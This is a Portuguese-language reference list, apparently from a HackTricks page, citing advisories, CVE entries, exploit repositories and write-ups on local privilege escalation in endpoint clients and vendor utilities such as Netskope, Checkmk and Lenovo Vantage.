- [2] [Comunicado de segurança da Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin do Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – cliente/exploit IPC do Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalonamento local de privilégios por meio de arquivos graváveis no Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalonamento de privilégios no agente do Windows](https://checkmk.com/werk/16361)
- [10] [PoCs de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Atores estatais exploram a cadeia de suprimentos do Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – atualização sobre o incidente de sequestro da infraestrutura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contornando a correção para CVE-2025-0309 no Netskope Client para Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Descobrindo bugs de escalonamento de privilégios no Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
